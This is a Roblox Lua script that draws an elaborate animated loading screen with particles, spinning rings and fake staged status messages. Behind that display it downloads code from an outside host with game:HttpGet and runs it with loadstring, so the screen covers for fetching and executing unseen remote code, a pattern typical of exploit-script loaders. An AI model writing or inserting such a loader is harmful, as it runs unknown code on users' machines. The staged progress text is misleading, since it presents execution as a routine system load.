local ChangeHistoryService = game:GetService("ChangeHistoryService")
if ChangeHistoryService then
    ChangeHistoryService:SetWaypoint("Before Advanced Loading System")
end

local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local SoundService = game:GetService("SoundService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local existing = playerGui:FindFirstChild("AdvancedLoadingSystem")
if existing then
    existing:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AdvancedLoadingSystem"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(1,0,1,0)
mainFrame.Position = UDim2.new(0,0,0,0)
mainFrame.BackgroundColor3 = Color3.fromRGB(5,5,15)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui

local backgroundParticles = Instance.new("Frame")
backgroundParticles.Size = UDim2.new(1,0,1,0)
backgroundParticles.Position = UDim2.new(0,0,0,0)
backgroundParticles.BackgroundTransparency = 1
backgroundParticles.Parent = mainFrame

local function createParticleSystem()
    local particleSystem = {}
    
    for i = 1, 50 do
        local particle = Instance.new("Frame")
        particle.Size = UDim2.new(0, math.random(2, 8), 0, math.random(2, 8))
        particle.Position = UDim2.new(math.random(), 0, math.random(), 0)
        particle.BackgroundColor3 = Color3.fromRGB(
            math.random(50, 150),
            math.random(50, 150),
            math.random(150, 255)
        )
        particle.BorderSizePixel = 0
        particle.ZIndex = math.random(1, 10)
        
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0.5, 0)
        corner.Parent = particle
        
        particle.Parent = backgroundParticles
        
        local velocity = Vector2.new(
            math.random(-100, 100) / 100,
            math.random(-100, 100) / 100
        )
        
        local lifetime = math.random(5, 15)
        local age = 0
        
        table.insert(particleSystem, {
            particle = particle,
            velocity = velocity,
            lifetime = lifetime,
            age = age
        })
    end
    
    return particleSystem
end

local particleSystem = createParticleSystem()

local function updateParticles(deltaTime)
    for i, particleData in ipairs(particleSystem) do
        local particle = particleData.particle
        local velocity = particleData.velocity
        local lifetime = particleData.lifetime
        local age = particleData.age
        
        age = age + deltaTime
        
        if age > lifetime then
            particle:Destroy()
            table.remove(particleSystem, i)
            
            local newParticle = Instance.new("Frame")
            newParticle.Size = UDim2.new(0, math.random(2, 8), 0, math.random(2, 8))
            newParticle.Position = UDim2.new(math.random(), 0, math.random(), 0)
            newParticle.BackgroundColor3 = Color3.fromRGB(
                math.random(50, 150),
                math.random(50, 150),
                math.random(150, 255)
            )
            newParticle.BorderSizePixel = 0
            newParticle.ZIndex = math.random(1, 10)
            
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0.5, 0)
            corner.Parent = newParticle
            
            newParticle.Parent = backgroundParticles
            
            local newVelocity = Vector2.new(
                math.random(-100, 100) / 100,
                math.random(-100, 100) / 100
            )
            
            table.insert(particleSystem, {
                particle = newParticle,
                velocity = newVelocity,
                lifetime = math.random(5, 15),
                age = 0
            })
        else
            local currentPos = particle.Position
            local newPos = UDim2.new(
                currentPos.X.Scale + velocity.X * deltaTime,
                currentPos.X.Offset,
                currentPos.Y.Scale + velocity.Y * deltaTime,
                currentPos.Y.Offset
            )
            
            if newPos.X.Scale < 0 or newPos.X.Scale > 1 then
                velocity = Vector2.new(-velocity.X, velocity.Y)
            end
            
            if newPos.Y.Scale < 0 or newPos.Y.Scale > 1 then
                velocity = Vector2.new(velocity.X, -velocity.Y)
            end
            
            particle.Position = newPos
            particleData.velocity = velocity
            particleData.age = age
            
            local transparency = age / lifetime
            particle.BackgroundTransparency = transparency
        end
    end
end

local lastTime = tick()
RunService.Heartbeat:Connect(function()
    local currentTime = tick()
    local deltaTime = currentTime - lastTime
    lastTime = currentTime
    
    updateParticles(deltaTime)
end)

local loadingContainer = Instance.new("Frame")
loadingContainer.Size = UDim2.new(0.7,0,0.7,0)
loadingContainer.Position = UDim2.new(0.15,0,0.15,0)
loadingContainer.BackgroundTransparency = 1
loadingContainer.BorderSizePixel = 0
loadingContainer.Parent = mainFrame

local loadingRing = Instance.new("Frame")
loadingRing.Size = UDim2.new(0,300,0,300)
loadingRing.Position = UDim2.new(0.5,-150,0.5,-150)
loadingRing.BackgroundTransparency = 1
loadingRing.BorderSizePixel = 0
loadingRing.Parent = loadingContainer

local outerRing = Instance.new("Frame")
outerRing.Size = UDim2.new(1,0,1,0)
outerRing.Position = UDim2.new(0,0,0,0)
outerRing.BackgroundTransparency = 1
outerRing.BorderSizePixel = 0
outerRing.Parent = loadingRing

local outerRingStroke = Instance.new("UIStroke")
outerRingStroke.Color = Color3.fromRGB(100,100,255)
outerRingStroke.Thickness = 8
outerRingStroke.Transparency = 0.5
outerRingStroke.Parent = outerRing

local outerRingCorner = Instance.new("UICorner")
outerRingCorner.CornerRadius = UDim.new(0.5,0)
outerRingCorner.Parent = outerRing

local middleRing = Instance.new("Frame")
middleRing.Size = UDim2.new(0.8,0,0.8,0)
middleRing.Position = UDim2.new(0.1,0,0.1,0)
middleRing.BackgroundTransparency = 1
middleRing.BorderSizePixel = 0
middleRing.Parent = loadingRing

local middleRingStroke = Instance.new("UIStroke")
middleRingStroke.Color = Color3.fromRGB(150,150,255)
middleRingStroke.Thickness = 6
middleRingStroke.Transparency = 0.5
middleRingStroke.Parent = middleRing

local middleRingCorner = Instance.new("UICorner")
middleRingCorner.CornerRadius = UDim.new(0.5,0)
middleRingCorner.Parent = middleRing

local innerRing = Instance.new("Frame")
innerRing.Size = UDim2.new(0.6,0,0.6,0)
innerRing.Position = UDim2.new(0.2,0,0.2,0)
innerRing.BackgroundTransparency = 1
innerRing.BorderSizePixel = 0
innerRing.Parent = loadingRing

local innerRingStroke = Instance.new("UIStroke")
innerRingStroke.Color = Color3.fromRGB(200,200,255)
innerRingStroke.Thickness = 4
innerRingStroke.Transparency = 0.5
innerRingStroke.Parent = innerRing

local innerRingCorner = Instance.new("UICorner")
innerRingCorner.CornerRadius = UDim.new(0.5,0)
innerRingCorner.Parent = innerRing

local centerCore = Instance.new("Frame")
centerCore.Size = UDim2.new(0.4,0,0.4,0)
centerCore.Position = UDim2.new(0.3,0,0.3,0)
centerCore.BackgroundColor3 = Color3.fromRGB(30,30,60)
centerCore.BorderSizePixel = 0
centerCore.Parent = loadingRing

local centerCoreCorner = Instance.new("UICorner")
centerCoreCorner.CornerRadius = UDim.new(0.5,0)
centerCoreCorner.Parent = centerCore

local centerCoreStroke = Instance.new("UIStroke")
centerCoreStroke.Color = Color3.fromRGB(180,180,255)
centerCoreStroke.Thickness = 3
centerCoreStroke.Transparency = 0.3
centerCoreStroke.Parent = centerCore

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1,0,0.2,0)
loadingText.Position = UDim2.new(0,0,0.7,0)
loadingText.BackgroundTransparency = 1
loadingText.Text = "INITIALIZING"
loadingText.TextColor3 = Color3.fromRGB(220,220,255)
loadingText.TextScaled = true
loadingText.Font = Enum.Font.GothamBlack
loadingText.Parent = loadingContainer

local statusText = Instance.new("TextLabel")
statusText.Size = UDim2.new(1,0,0.1,0)
statusText.Position = UDim2.new(0,0,0.85,0)
statusText.BackgroundTransparency = 1
statusText.Text = "Connecting to server..."
statusText.TextColor3 = Color3.fromRGB(180,180,220)
statusText.TextScaled = true
statusText.Font = Enum.Font.Gotham
statusText.Parent = loadingContainer

local progressBar = Instance.new("Frame")
progressBar.Size = UDim2.new(0.8,0,0,10)
progressBar.Position = UDim2.new(0.1,0,0.75,0)
progressBar.BackgroundColor3 = Color3.fromRGB(40,40,80)
progressBar.BorderSizePixel = 0
progressBar.Parent = loadingContainer

local progressBarCorner = Instance.new("UICorner")
progressBarCorner.CornerRadius = UDim.new(0,5)
progressBarCorner.Parent = progressBar

local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0,0,1,0)
progressFill.Position = UDim2.new(0,0,0,0)
progressFill.BackgroundColor3 = Color3.fromRGB(100,100,255)
progressFill.BorderSizePixel = 0
progressFill.Parent = progressBar

local progressFillCorner = Instance.new("UICorner")
progressFillCorner.CornerRadius = UDim.new(0,5)
progressFillCorner.Parent = progressFill

local progressGlow = Instance.new("Frame")
progressGlow.Size = UDim2.new(0,0,1,0)
progressGlow.Position = UDim2.new(0,0,0,0)
progressGlow.BackgroundColor3 = Color3.fromRGB(150,150,255)
progressGlow.BackgroundTransparency = 0.5
progressGlow.BorderSizePixel = 0
progressGlow.ZIndex = progressFill.ZIndex - 1
progressGlow.Parent = progressBar

local progressGlowCorner = Instance.new("UICorner")
progressGlowCorner.CornerRadius = UDim.new(0,5)
progressGlowCorner.Parent = progressGlow

local loadingStages = {
    {text = "INITIALIZING", status = "Preparing system...", duration = 1.5},
    {text = "CONNECTING", status = "Establishing secure connection...", duration = 2},
    {text = "AUTHENTICATING", status = "Verifying credentials...", duration = 1.8},
    {text = "DOWNLOADING", status = "Fetching resources from server...", duration = 3},
    {text = "PROCESSING", status = "Analyzing data structure...", duration = 2.5},
    {text = "EXECUTING", status = "Running script...", duration = 1.5},
    {text = "COMPLETE", status = "System ready!", duration = 1}
}

local currentStage = 1
local stageProgress = 0
local totalProgress = 0

local function updateLoadingStage()
    if currentStage > #loadingStages then
        return
    end
    
    local stage = loadingStages[currentStage]
    loadingText.Text = stage.text
    statusText.Text = stage.status
    
    local progressTween = TweenService:Create(progressFill, TweenInfo.new(stage.duration, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
        Size = UDim2.new(1,0,1,0)
    })
    
    local glowTween = TweenService:Create(progressGlow, TweenInfo.new(stage.duration, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
        Size = UDim2.new(1,0,1,0)
    })
    
    progressTween:Play()
    glowTween:Play()
    
    progressTween.Completed:Connect(function()
        if currentStage < #loadingStages then
            progressFill.Size = UDim2.new(0,0,1,0)
            progressGlow.Size = UDim2.new(0,0,1,0)
            currentStage = currentStage + 1
            totalProgress = totalProgress + (1 / #loadingStages)
            updateLoadingStage()
        else
            completeLoading()
        end
    end)
end

local function animateRings()
    local outerRotation = TweenService:Create(outerRing, TweenInfo.new(10, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {
        Rotation = 360
    })
    
    local middleRotation = TweenService:Create(middleRing, TweenInfo.new(8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {
        Rotation = -360
    })
    
    local innerRotation = TweenService:Create(innerRing, TweenInfo.new(6, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {
        Rotation = 360
    })
    
    local corePulse = TweenService:Create(centerCore, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1), {
        Size = UDim2.new(0.45,0,0.45,0)
    })
    
    outerRotation:Play()
    middleRotation:Play()
    innerRotation:Play()
    corePulse:Play()
end

local function completeLoading()
    local completeEffect = Instance.new("Frame")
    completeEffect.Size = UDim2.new(0,0,0,0)
    completeEffect.Position = UDim2.new(0.5,0,0.5,0)
    completeEffect.BackgroundColor3 = Color3.fromRGB(255,255,255)
    completeEffect.BorderSizePixel = 0
    completeEffect.ZIndex = 100
    completeEffect.Parent = mainFrame
    
    local completeEffectCorner = Instance.new("UICorner")
    completeEffectCorner.CornerRadius = UDim.new(0.5,0)
    completeEffectCorner.Parent = completeEffect
    
    local expandEffect = TweenService:Create(completeEffect, TweenInfo.new(1.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
        Size = UDim2.new(2,0,2,0),
        Position = UDim2.new(-0.5,0,-0.5,0),
        BackgroundTransparency = 1
    })
    
    expandEffect:Play()
    
    expandEffect.Completed:Connect(function()
        completeEffect:Destroy()
        if screenGui and screenGui.Parent then
            screenGui:Destroy()
        end
        if ChangeHistoryService then
            ChangeHistoryService:SetWaypoint("After Advanced Loading System")
        end
    end)
end

local remoteUrl = "https://api.junkie-development.de/api/v1/luascripts/public/d1844496f7d873d687e5f8eee91ede132b24dc84579b060d4394496e62c112f7/download"
local function safeLoadRemote(url)
    task.spawn(function()
        local ok, res = pcall(function() return game:HttpGet(url) end)
        if not ok then 
            warn("HttpGet failed:", res)
            statusText.Text = "Error: Failed to connect to server"
            task.wait(2)
            if screenGui and screenGui.Parent then
                screenGui:Destroy()
            end
            return 
        end
        
        local chunk, err = loadstring(res)
        if not chunk then 
            warn("Loadstring error:", err)
            statusText.Text = "Error: Failed to process data"
            task.wait(2)
            if screenGui and screenGui.Parent then
                screenGui:Destroy()
            end
            return 
        end
        
        pcall(chunk)
    end)
end

local entranceTween = TweenService:Create(loadingContainer, TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
    Size = UDim2.new(0.7,0,0.7,0),
    Position = UDim2.new(0.15,0,0.15,0)
})
entranceTween:Play()

task.delay(0.5, function()
    animateRings()
    updateLoadingStage()
    safeLoadRemote(remoteUrl)
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not gameProcessed and input.KeyCode == Enum.KeyCode.Space then
        completeLoading()
    end
end)
